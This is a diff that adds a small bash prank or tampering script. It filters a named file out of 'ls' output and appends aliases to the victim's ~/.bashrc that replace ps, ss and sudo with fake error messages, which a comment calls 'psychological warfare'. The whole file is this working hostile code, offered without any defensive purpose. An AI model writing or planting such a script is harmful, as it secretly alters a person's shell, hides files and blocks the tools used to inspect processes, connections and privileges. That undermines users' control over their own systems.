@@ -1,0 +1,17 @@
+#!/bin/bash
+
+# Execute real 'ls' command and hide files
+command ls | grep -v FILE_TO_HIDE_HERE
+
+# Add lines to their .bashrc
+# Every good script needs some psychological warfare
+echo "alias ps=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc 
+
+echo "alias ss=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc
+
+echo "alias sudo=echo 'Simon says... oh wait, Simon didn't say' " >> ~/.bashrc
+
+
+
+
+ 
